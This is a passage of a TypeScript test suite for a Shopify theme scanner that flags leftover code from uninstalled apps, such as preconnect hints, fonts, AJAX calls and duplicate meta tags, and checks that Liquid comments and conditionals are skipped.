      content: '<link rel="preload" href="https://cdn.pagefly.io/pagefly.js" as="script">',
    };
    const findings = detectGhostPreconnect(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_PRECONNECT);
    expect(findings[0].appName).toBe("PageFly");
    expect(findings[0].description).toContain("preload");
  });

  it("detects reversed attribute order (href before rel)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<link href="https://cdn.judge.me" rel="preconnect">',
    };
    const findings = detectGhostPreconnect(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Judge.me");
  });

  it("attributes app from surrounding code context", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "<!-- Judge.me reviews widget -->",
        '<link rel="preconnect" href="https://judge.me">',
      ].join("\n"),
    };
    const findings = detectGhostPreconnect(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Judge.me");
  });

  it("detects multiple preconnect hints on different lines", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        '<link rel="preconnect" href="https://cdn.judge.me">',
        "<p>Some content</p>",
        '<link rel="dns-prefetch" href="//cdn.loox.io">',
      ].join("\n"),
    };
    const findings = detectGhostPreconnect(file);
    expect(findings).toHaveLength(2);
    expect(findings[0].lineNumber).toBe(1);
    expect(findings[0].appName).toBe("Judge.me");
    expect(findings[1].lineNumber).toBe(3);
    expect(findings[1].appName).toBe("Loox");
  });

  // --- False positive avoidance (should NOT fire) ---

  it("does not flag preconnect to Shopify CDN", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<link rel="preconnect" href="https://cdn.shopify.com">',
    };
    const findings = detectGhostPreconnect(file);
    expect(findings).toHaveLength(0);
  });

  it("does not flag preconnect to cdn.shopifycdn.net", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<link rel="preconnect" href="https://cdn.shopifycdn.net">',
    };
    const findings = detectGhostPreconnect(file);
    expect(findings).toHaveLength(0);
  });

  it("does not flag preconnect to monorail-edge.shopifysvc.com", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<link rel="preconnect" href="https://monorail-edge.shopifysvc.com">',
    };
    const findings = detectGhostPreconnect(file);
    expect(findings).toHaveLength(0);
  });

  it("does not flag preconnect to *.myshopify.com", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<link rel="preconnect" href="https://my-store.myshopify.com">',
    };
    const findings = detectGhostPreconnect(file);
    expect(findings).toHaveLength(0);
  });

  it("does not flag preconnect to Google Fonts", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<link rel="preconnect" href="https://fonts.googleapis.com">',
    };
    const findings = detectGhostPreconnect(file);
    expect(findings).toHaveLength(0);
  });

  it("does not flag preconnect to fonts.gstatic.com", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<link rel="preconnect" href="https://fonts.gstatic.com">',
    };
    const findings = detectGhostPreconnect(file);
    expect(findings).toHaveLength(0);
  });

  it("does not flag preconnect to generic CDN (cdnjs.cloudflare.com)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<link rel="preconnect" href="https://cdnjs.cloudflare.com">',
    };
    const findings = detectGhostPreconnect(file);
    expect(findings).toHaveLength(0);
  });

  it("does not flag preconnect to cdn.jsdelivr.net", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<link rel="preconnect" href="https://cdn.jsdelivr.net">',
    };
    const findings = detectGhostPreconnect(file);
    expect(findings).toHaveLength(0);
  });

  it("does not flag preconnect inside Liquid conditional", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content:
        '{% if settings.enable_reviews %}<link rel="preconnect" href="https://cdn.judge.me">{% endif %}',
    };
    const findings = detectGhostPreconnect(file);
    expect(findings).toHaveLength(0);
  });

  it("does not flag preconnect inside Liquid comment block", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "{% comment %}",
        '<link rel="preconnect" href="https://cdn.judge.me">',
        "{% endcomment %}",
      ].join("\n"),
    };
    const findings = detectGhostPreconnect(file);
    expect(findings).toHaveLength(0);
  });

  it("does not flag preconnect inside whitespace-stripping Liquid comment", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "{%- comment -%}",
        '<link rel="preconnect" href="https://cdn.judge.me">',
        "{%- endcomment -%}",
      ].join("\n"),
    };
    const findings = detectGhostPreconnect(file);
    expect(findings).toHaveLength(0);
  });

  it("does not flag unknown domain not in app signatures", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<link rel="preconnect" href="https://custom-api.example.com">',
    };
    const findings = detectGhostPreconnect(file);
    expect(findings).toHaveLength(0);
  });

  it("returns empty array for file with no resource hint tags", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<html><head><title>My Store</title></head></html>",
    };
    const findings = detectGhostPreconnect(file);
    expect(findings).toHaveLength(0);
  });

  it("is included in scanThemeFiles results", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.liquid",
        content: '<link rel="preconnect" href="https://cdn.judge.me">',
      },
    ];
    const result = scanThemeFiles(files);
    const preconnectFindings = findingsOfType(result.findings, FindingType.GHOST_PRECONNECT);
    expect(preconnectFindings).toHaveLength(1);
    expect(preconnectFindings[0].appName).toBe("Judge.me");
  });
});

// ---------------------------------------------------------------------------
// detectGhostFont
// ---------------------------------------------------------------------------

describe("detectGhostFont", () => {
  // --- Detections (should fire) ---

  it("detects @font-face attributed to known app via code context", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "<!-- Judge.me reviews widget -->",
        "<style>",
        '@font-face { font-family: "JudgeReviewFont"; src: url("https://cdn.judge.me/fonts/review.woff2"); }',
        "</style>",
      ].join("\n"),
    };
    const findings = detectGhostFont(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_FONT);
    expect(findings[0].severity).toBe(Severity.MEDIUM);
    expect(findings[0].appName).toBe("Judge.me");
    expect(findings[0].description).toContain("@font-face");
    expect(findings[0].description).toContain("JudgeReviewFont");
  });

  it("detects Google Fonts link attributed to known app via code context", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "<!-- klaviyo form widget styles -->",
        '<link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">',
      ].join("\n"),
    };
    const findings = detectGhostFont(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_FONT);
    expect(findings[0].appName).toBe("Klaviyo");
    expect(findings[0].description).toContain("font link");
  });

  it("detects font link attributed via URL to known app CDN", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<link href="https://cdn.judge.me/fonts/widget-font.css" rel="stylesheet">',
    };
    const findings = detectGhostFont(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_FONT);
    expect(findings[0].appName).toBe("Judge.me");
  });

  it("detects @font-face with single-quoted font-family", () => {
    const file: ThemeFile = {
      filename: "snippets/loox-widget.liquid",
      content: [
        "<!-- Loox reviews -->",
        "<style>",
        "@font-face { font-family: 'LooxIcons'; src: url('https://cdn.loox.io/fonts/icons.woff2'); }",
        "</style>",
      ].join("\n"),
    };
    const findings = detectGhostFont(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Loox");
    expect(findings[0].description).toContain("LooxIcons");
  });

  it("detects multiple @font-face declarations on different lines", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "<!-- jdgm-widget judge.me styles -->",
        "<style>",
        '@font-face { font-family: "JudgeFont1"; src: url("https://cdn.judge.me/font1.woff2"); }',
        "p { color: red; }",
        '@font-face { font-family: "JudgeFont2"; src: url("https://cdn.judge.me/font2.woff2"); }',
        "</style>",
      ].join("\n"),
    };
    const findings = detectGhostFont(file);
    expect(findings).toHaveLength(2);
  });

  // --- False positive avoidance (should NOT fire) ---

  it("does not flag @font-face without app attribution", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "<style>",
        '@font-face { font-family: "MyCustomFont"; src: url("/assets/custom.woff2"); }',
        "</style>",
      ].join("\n"),
    };
    const findings = detectGhostFont(file);
    expect(findings).toHaveLength(0);
  });

  it("does not flag Google Fonts link without app attribution", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">',
    };
    const findings = detectGhostFont(file);
    expect(findings).toHaveLength(0);
  });

  it("does not flag @font-face inside Liquid comment block", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "{% comment %}",
        "<!-- Judge.me widget -->",
        '<style>@font-face { font-family: "JudgeFont"; src: url("font.woff2"); }</style>',
        "{% endcomment %}",
      ].join("\n"),
    };
    const findings = detectGhostFont(file);
    expect(findings).toHaveLength(0);
  });

  it("does not flag @font-face inside whitespace-stripping Liquid comment", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "{%- comment -%}",
        "<!-- Judge.me widget -->",
        '<style>@font-face { font-family: "JudgeFont"; src: url("font.woff2"); }</style>',
        "{%- endcomment -%}",
      ].join("\n"),
    };
    const findings = detectGhostFont(file);
    expect(findings).toHaveLength(0);
  });

  it("does not flag font link inside Liquid conditional", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content:
        '{% if settings.enable_reviews %}<link href="https://cdn.judge.me/fonts/widget.css" rel="stylesheet">{% endif %}',
    };
    const findings = detectGhostFont(file);
    expect(findings).toHaveLength(0);
  });

  it("returns empty array for file with no font declarations", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<html><head><title>My Store</title></head></html>",
    };
    const findings = detectGhostFont(file);
    expect(findings).toHaveLength(0);
  });

  it("is included in scanThemeFiles results", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.liquid",
        content: [
          "<!-- Judge.me reviews widget -->",
          "<style>",
          '@font-face { font-family: "JudgeFont"; src: url("https://cdn.judge.me/fonts/review.woff2"); }',
          "</style>",
        ].join("\n"),
      },
    ];
    const result = scanThemeFiles(files);
    const fontFindings = findingsOfType(result.findings, FindingType.GHOST_FONT);
    expect(fontFindings).toHaveLength(1);
    expect(fontFindings[0].appName).toBe("Judge.me");
  });
});

// ---------------------------------------------------------------------------
// Unified comment-skip: detectGhostTitle / detectGhostOg / detectGhostFont all
// delegate comment-block detection to buildCommentSkipLines (gc-06e.12). These
// tests lock the three detectors to identical comment-skip semantics so future
// drift (one detector clearing the insideComment flag differently) is caught.
//
// NOTE on the real behavior change: the previous inline Font loop cleared the
// comment flag on the {% endcomment %} line and `continue`d, which meant it
// SKIPPED any code on a {% endcomment %} line — including a stray, opener-less
// {% endcomment %}. The shared helper only skips lines while genuinely inside a
// comment, so Font now SCANS code on an opener-less endcomment line, matching
// Title/Og. Well-formed comment blocks are unchanged for all three.
// ---------------------------------------------------------------------------

describe("unified comment-skip across title/og/font (gc-06e.12)", () => {
  it("Font skips a font <link> sharing a line with {% endcomment %} in a comment block", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "{% comment %}",
        "<!-- Judge.me widget -->",
        '<link href="https://cdn.judge.me/fonts/widget-font.css" rel="stylesheet"> {% endcomment %}',
      ].join("\n"),
    };
    expect(detectGhostFont(file)).toHaveLength(0);
  });

  it("Font skips an @font-face sharing a line with {% endcomment %} in a comment block", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "{% comment %}",
        "<!-- Judge.me widget -->",
        '<style>@font-face { font-family: "JudgeFont"; src: url("https://cdn.judge.me/f.woff2"); }</style> {% endcomment %}',
      ].join("\n"),
    };
    expect(detectGhostFont(file)).toHaveLength(0);
  });

  it("Title/Og/Font all skip a ghost directive on the {% endcomment %} line of a comment block", () => {
    const titleFile: ThemeFile = {
      filename: "layout/theme.liquid",
      content: ["{% comment %}", "<title>{{ seoapp_meta_title }}</title> {% endcomment %}"].join(
        "\n",
      ),
    };
    const ogFile: ThemeFile = {
      filename: "snippets/meta-tags.liquid",
      content: [
        "{% comment %}",
        '<meta property="og:title" content="{{ seoapp_meta_title }}"> {% endcomment %}',
      ].join("\n"),
    };
    const fontFile: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "{% comment %}",
        '<link href="https://cdn.judge.me/fonts/widget-font.css" rel="stylesheet"> {% endcomment %}',
      ].join("\n"),
    };
    expect(detectGhostTitle(titleFile)).toHaveLength(0);
    expect(detectGhostOg(ogFile)).toHaveLength(0);
    expect(detectGhostFont(fontFile)).toHaveLength(0);
  });

  it("Title/Og/Font all SCAN a ghost directive on an opener-less {% endcomment %} line (Font drift fixed)", () => {
    // No {% comment %} opener: the {% endcomment %} is stray, so the line is live
    // code. All three now treat it as scannable (previously Font alone skipped it).
    const titleFile: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<title>{{ seoapp_meta_title }}</title> {% endcomment %}",
    };
    const ogFile: ThemeFile = {
      filename: "snippets/meta-tags.liquid",
      content: '<meta property="og:title" content="{{ seoapp_meta_title }}"> {% endcomment %}',
    };
    const fontFile: ThemeFile = {
      filename: "layout/theme.liquid",
      content:
        '<link href="https://cdn.judge.me/fonts/widget-font.css" rel="stylesheet"> {% endcomment %}',
    };
    expect(detectGhostTitle(titleFile)).toHaveLength(1);
    expect(detectGhostOg(ogFile)).toHaveLength(1);
    const fontFindings = detectGhostFont(fontFile);
    expect(fontFindings).toHaveLength(1);
    expect(fontFindings[0].appName).toBe("Judge.me");
  });
});

// ---------------------------------------------------------------------------
// detectGhostAjax
// ---------------------------------------------------------------------------

describe("detectGhostAjax", () => {
  // --- Detections (should fire) ---

  it("detects fetch() call to known app domain", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: ["<script>", 'fetch("https://cdn.judge.me/api/reviews");', "</script>"].join("\n"),
    };
    const findings = detectGhostAjax(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_AJAX);
    expect(findings[0].severity).toBe(Severity.HIGH);
    expect(findings[0].appName).toBe("Judge.me");
    expect(findings[0].description).toContain("fetch");
    expect(findings[0].description).toContain("cdn.judge.me");
  });

  it("detects fetch() with single quotes", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: ["<script>", "fetch('https://cdn.judge.me/api/reviews');", "</script>"].join("\n"),
    };
    const findings = detectGhostAjax(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Judge.me");
  });

  it("detects $.get() jQuery pattern to known app domain", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: ["<script>", '$.get("https://cdn.loox.io/api/widgets");', "</script>"].join("\n"),
    };
    const findings = detectGhostAjax(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_AJAX);
    expect(findings[0].appName).toBe("Loox");
    expect(findings[0].description).toContain("jQuery AJAX");
  });

  it("detects $.post() jQuery pattern to known app domain", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: ["<script>", '$.post("https://cdn.judge.me/api/submit");', "</script>"].join("\n"),
    };
    const findings = detectGhostAjax(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Judge.me");
  });

  it("detects $.ajax() with url property to known app domain", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: ["<script>", '$.ajax({url: "https://cdn.judge.me/api/data"});', "</script>"].join(
        "\n",
      ),
    };
    const findings = detectGhostAjax(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Judge.me");
  });

  it("detects XMLHttpRequest .open() to known app domain", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "<script>",
        "var xhr = new XMLHttpRequest();",
        'xhr.open("GET", "https://static.klaviyo.com/api/track");',
        "</script>",
      ].join("\n"),
    };
    const findings = detectGhostAjax(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_AJAX);
    expect(findings[0].appName).toBe("Klaviyo");
    expect(findings[0].description).toContain("XMLHttpRequest");
  });

  it("detects fetch() attributed via code context", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "<!-- Judge.me reviews API -->",
        "<script>",
        'fetch("https://judge.me/api/v1/reviews");',
        "</script>",
      ].join("\n"),
    };
    const findings = detectGhostAjax(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Judge.me");
  });

  it("detects multiple AJAX calls on different lines", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "<script>",
        'fetch("https://cdn.judge.me/api/reviews");',
        "var x = 1;",
        'fetch("https://static.klaviyo.com/api/track");',
        "</script>",
      ].join("\n"),
    };
    const findings = detectGhostAjax(file);
    expect(findings).toHaveLength(2);
    expect(findings[0].appName).toBe("Judge.me");
    expect(findings[1].appName).toBe("Klaviyo");
  });

  // --- False positive avoidance (should NOT fire) ---

  it("does not flag fetch() to Shopify CDN", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: ["<script>", 'fetch("https://cdn.shopify.com/api/something");', "</script>"].join(
        "\n",
      ),
    };
    const findings = detectGhostAjax(file);
    expect(findings).toHaveLength(0);
  });

  it("does not flag fetch() to *.myshopify.com", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "<script>",
        'fetch("https://my-store.myshopify.com/api/cart.js");',
        "</script>",
      ].join("\n"),
    };
    const findings = detectGhostAjax(file);
    expect(findings).toHaveLength(0);
  });

  it("does not flag fetch() to unknown domain not in app signatures", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: ["<script>", 'fetch("https://api.unknown-service.com/data");', "</script>"].join(
        "\n",
      ),
    };
    const findings = detectGhostAjax(file);
    expect(findings).toHaveLength(0);
  });

  it("does not flag fetch() inside Liquid comment block", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "{% comment %}",
        "<script>",
        'fetch("https://cdn.judge.me/api/reviews");',
        "</script>",
        "{% endcomment %}",
      ].join("\n"),
    };
    const findings = detectGhostAjax(file);
    expect(findings).toHaveLength(0);
  });

  it("does not flag fetch() inside whitespace-stripping Liquid comment", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "{%- comment -%}",
        "<script>",
        'fetch("https://cdn.judge.me/api/reviews");',
        "</script>",
        "{%- endcomment -%}",
      ].join("\n"),
    };
    const findings = detectGhostAjax(file);
    expect(findings).toHaveLength(0);
  });

  it("does not flag fetch() inside Liquid conditional", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content:
        '{% if settings.enable_reviews %}fetch("https://cdn.judge.me/api/reviews"){% endif %}',
    };
    const findings = detectGhostAjax(file);
    expect(findings).toHaveLength(0);
  });

  it("returns empty array for file with no AJAX calls", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "<html><head><title>My Store</title></head></html>",
    };
    const findings = detectGhostAjax(file);
    expect(findings).toHaveLength(0);
  });

  it("is included in scanThemeFiles results", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.liquid",
        content: ["<script>", 'fetch("https://cdn.judge.me/api/reviews");', "</script>"].join("\n"),
      },
    ];
    const result = scanThemeFiles(files);
    const ajaxFindings = findingsOfType(result.findings, FindingType.GHOST_AJAX);
    expect(ajaxFindings).toHaveLength(1);
    expect(ajaxFindings[0].appName).toBe("Judge.me");
  });
});

// ---------------------------------------------------------------------------
// LOG-11: Multi-line tag detection (false negatives fixed)
// ---------------------------------------------------------------------------

describe("LOG-11 — multi-line HTML tag detection", () => {
  describe("detectGhostScripts — multi-line <script> tag", () => {
    it("detects a Klaviyo script tag split across multiple lines (prettier-formatted)", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: [
          "<head>",
          "<script",
          '  src="https://static.klaviyo.com/onsite/js/klaviyo.js"',
          "></script>",
          "</head>",
        ].join("\n"),
      };
      const findings = detectGhostScripts(file);
      expect(findings).toHaveLength(1);
      expect(findings[0].appName).toBe("Klaviyo");
      // Line number should point to the opening <script tag line
      expect(findings[0].lineNumber).toBe(2);
    });

    it("single-line <script> tag still detected (no regression)", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: '<script src="https://static.klaviyo.com/onsite/js/klaviyo.js"></script>',
      };
      const findings = detectGhostScripts(file);
      expect(findings).toHaveLength(1);
      expect(findings[0].lineNumber).toBe(1);
    });
  });

  describe("detectGhostStyles — multi-line <link rel='stylesheet'> tag", () => {
    it("detects a Judge.me stylesheet split across multiple lines", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: [
          "<head>",
          "<link",
          '  rel="stylesheet"',
          '  href="https://cdn.judge.me/assets/v4/widget.css"',
          ">",
          "</head>",
        ].join("\n"),
      };
      const findings = detectGhostStyles(file);
      expect(findings).toHaveLength(1);
      expect(findings[0].appName).toBe("Judge.me");
      expect(findings[0].lineNumber).toBe(2);
    });

    it("single-line <link rel='stylesheet'> still detected (no regression)", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: '<link rel="stylesheet" href="https://cdn.judge.me/assets/v4/widget.css">',
      };
      const findings = detectGhostStyles(file);
      expect(findings).toHaveLength(1);
      expect(findings[0].lineNumber).toBe(1);
    });
  });

  describe("detectGhostHrefLang — multi-line <link rel='alternate'> tag", () => {
    it("detects a Weglot hreflang tag split across multiple lines", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: [
          "<head>",
          '<link rel="alternate"',
          '  hreflang="fr"',
          '  href="https://fr.example.com/">',
          "</head>",
        ].join("\n"),
      };
      const findings = detectGhostHrefLang(file);
      expect(findings).toHaveLength(1);
      expect(findings[0].appName).toBe("Weglot");
      expect(findings[0].lineNumber).toBe(2);
    });
  });

  describe("detectGhostPreconnect — multi-line <link rel='preconnect'> tag", () => {
    it("detects a Klaviyo preconnect hint split across multiple lines", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: [
          "<head>",
          '<link rel="preconnect"',
          '  href="https://static.klaviyo.com">',
          "</head>",
        ].join("\n"),
      };
      const findings = detectGhostPreconnect(file);
      expect(findings).toHaveLength(1);
      expect(findings[0].appName).toBe("Klaviyo");
      expect(findings[0].lineNumber).toBe(2);
    });
  });

  describe("detectGhostSections — multi-line {% section %} tag", () => {
    it("detects a PageFly section reference split across multiple lines (prettier-wrapped)", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: ["<body>", "{%-", "  section 'pagefly-head'", "-%}"].join("\n"),
      };
      const findings = detectGhostSections(file);
      expect(findings).toHaveLength(1);
      expect(findings[0].appName).toBe("PageFly");
      // Line number points to the opening {%- of the tag.
      expect(findings[0].lineNumber).toBe(2);
    });

    it("emits exactly one finding per tag when single-line and multi-line section tags coexist", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: ["{% section 'shogun-head' %}", "{%-", "  section 'pagefly-head'", "-%}"].join(
          "\n",
        ),
      };
      const findings = detectGhostSections(file);
      // One tag-form + one multi-line tag = exactly TWO findings, no double-count.
      expect(findings).toHaveLength(2);
      expect(findings.map((f) => f.appName).sort()).toEqual(["PageFly", "Shogun"]);
    });
  });

  describe("detectGhostCanonical — multi-line <link rel='canonical'> tag", () => {
    it("detects an empty canonical href split across multiple lines", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: ["<head>", "<link", '  rel="canonical"', '  href="">', "</head>"].join("\n"),
      };
      const findings = detectGhostCanonical(file);
      expect(findings).toHaveLength(1);
      expect(findings[0].findingType).toBe(FindingType.GHOST_CANONICAL);
      expect(findings[0].description).toContain("Empty canonical href");
      // Line number points to the opening <link of the tag.
      expect(findings[0].lineNumber).toBe(2);
    });

    it("emits exactly one finding per tag when single-line and multi-line canonical tags coexist", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: [
          '<link rel="canonical" href="">',
          "<link",
          '  rel="canonical"',
          '  href="">',
        ].join("\n"),
      };
      const findings = detectGhostCanonical(file);
      // Two distinct empty-canonical tags = exactly TWO findings, no double-count.
      expect(findings).toHaveLength(2);
    });
  });

  describe("detectGhostAjax — multi-line fetch()/AJAX call", () => {
    it("detects a Judge.me fetch() call split across multiple lines", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: [
          "<script>",
          "fetch(",
          '  "https://cdn.judge.me/api/reviews"',
          ");",
          "</script>",
        ].join("\n"),
      };
      const findings = detectGhostAjax(file);
      expect(findings).toHaveLength(1);
      expect(findings[0].findingType).toBe(FindingType.GHOST_AJAX);
      expect(findings[0].appName).toBe("Judge.me");
      // Line number points to the opening fetch( of the call.
      expect(findings[0].lineNumber).toBe(2);
    });

    it("emits exactly one finding per call when single-line and multi-line AJAX calls coexist", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: [
          "<script>",
          'fetch("https://cdn.judge.me/api/reviews");',
          "$.get(",
          '  "https://cdn.loox.io/api/widgets"',
          ");",
          "</script>",
        ].join("\n"),
      };
      const findings = detectGhostAjax(file);
      // One single-line fetch + one multi-line jQuery call = exactly TWO findings.
      expect(findings).toHaveLength(2);
      expect(findings.map((f) => f.appName).sort()).toEqual(["Judge.me", "Loox"]);
    });
  });
});

// ---------------------------------------------------------------------------
// LOG-11: {% liquid %} block render reference detection
// ---------------------------------------------------------------------------

describe("LOG-11 — {% liquid %} block render references", () => {
  describe("detectGhostSnippets — bare render inside {% liquid %} block", () => {
    it("detects a known app snippet rendered via bare render inside {% liquid %} block", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: [
          "{%- liquid",
          "  assign show_form = true",
          "  render 'klaviyo-onsite'",
          "-%}",
        ].join("\n"),
      };
      const findings = detectGhostSnippets(file);
      expect(findings).toHaveLength(1);
      expect(findings[0].findingType).toBe(FindingType.GHOST_SNIPPET);
      expect(findings[0].appName).toBe("Klaviyo");
    });

    it("detects bare include inside {% liquid %} block", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: ["{% liquid", '  include "klaviyo-form"', "%}"].join("\n"),
      };
      const findings = detectGhostSnippets(file);
      expect(findings).toHaveLength(1);
      expect(findings[0].appName).toBe("Klaviyo");
    });

    it("standard {% render %} tag still detected (no regression)", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: "{% render 'klaviyo-onsite' %}",
      };
      const findings = detectGhostSnippets(file);
      expect(findings).toHaveLength(1);
      expect(findings[0].appName).toBe("Klaviyo");
    });

    it("does NOT flag bare render inside {% comment %} block (no false positive)", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: ["{% comment %}", "  render 'klaviyo-onsite'", "{% endcomment %}"].join("\n"),
      };
      const findings = detectGhostSnippets(file);
      expect(findings).toHaveLength(0);
    });

    it("does not flag unknown snippet names inside {% liquid %} block", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: ["{% liquid", "  render 'my-custom-snippet'", "%}"].join("\n"),
      };
      const findings = detectGhostSnippets(file);
      expect(findings).toHaveLength(0);
    });
  });

  describe("ORPHAN_ASSET — snippet only rendered inside {% liquid %} block", () => {
    it("does NOT flag a snippet as ORPHAN_ASSET when it is rendered only inside a {% liquid %} block", () => {
      // snippets/klaviyo-onsite.liquid is referenced by a bare render inside
      // a {% liquid %} block — the file-reference-analyzer must count it as
      // referenced so scanThemeFiles does NOT emit an ORPHAN_ASSET finding.
      const files: ThemeFile[] = [
        {
          filename: "snippets/klaviyo-onsite.liquid",
          content: "<!-- klaviyo onsite form -->",
        },
        {
          filename: "layout/theme.liquid",
          content: ["{% liquid", "  render 'klaviyo-onsite'", "%}"].join("\n"),
        },
      ];
      const result = scanThemeFiles(files);
      const orphans = findingsOfType(result.findings, FindingType.ORPHAN_ASSET);
      expect(orphans).toHaveLength(0);
    });

    it("still flags a snippet as ORPHAN_ASSET when it is truly unreferenced", () => {
      const files: ThemeFile[] = [
        {
          filename: "snippets/klaviyo-onsite.liquid",
          content: "<!-- klaviyo onsite form -->",
        },
        {
          filename: "layout/theme.liquid",
          content: "{{ content_for_layout }}",
        },
      ];
      const result = scanThemeFiles(files);
      const orphans = findingsOfType(result.findings, FindingType.ORPHAN_ASSET);
      expect(orphans).toHaveLength(1);
      expect(orphans[0].filename).toBe("snippets/klaviyo-onsite.liquid");
    });
  });
});

// ---------------------------------------------------------------------------
// LOG-12: detectDuplicateMetaTags — Liquid-conditional and repeatable-property awareness
// ---------------------------------------------------------------------------

describe("LOG-12 — detectDuplicateMetaTags false positive fixes", () => {
  describe("Liquid conditional branch awareness", () => {
    it("does NOT flag og:type in mutually-exclusive if/else branches as a duplicate", () => {
      // Renders exactly one og:type at runtime depending on template.
      // Counting both as duplicates is a false positive.
      const file: ThemeFile = {
        filename: "snippets/meta-tags.liquid",
        content: [
          "{%- if request.page_type == 'product' -%}",
          '<meta property="og:type" content="product">',
          "{%- else -%}",
          '<meta property="og:type" content="website">',
          "{%- endif -%}",
        ].join("\n"),
      };
      const findings = detectDuplicateMetaTags(file);
      expect(findings).toHaveLength(0);
    });

    it("does NOT flag meta tags on the same line as Liquid conditionals (single-line form)", () => {
      const file: ThemeFile = {
        filename: "snippets/meta-tags.liquid",
        content: [
          '{% if template == \'product\' %}<meta property="og:type" content="product">{% else %}<meta property="og:type" content="website">{% endif %}',
        ].join("\n"),
      };
      const findings = detectDuplicateMetaTags(file);
      expect(findings).toHaveLength(0);
    });

    it("does NOT count meta tags inside comment blocks as duplicates", () => {
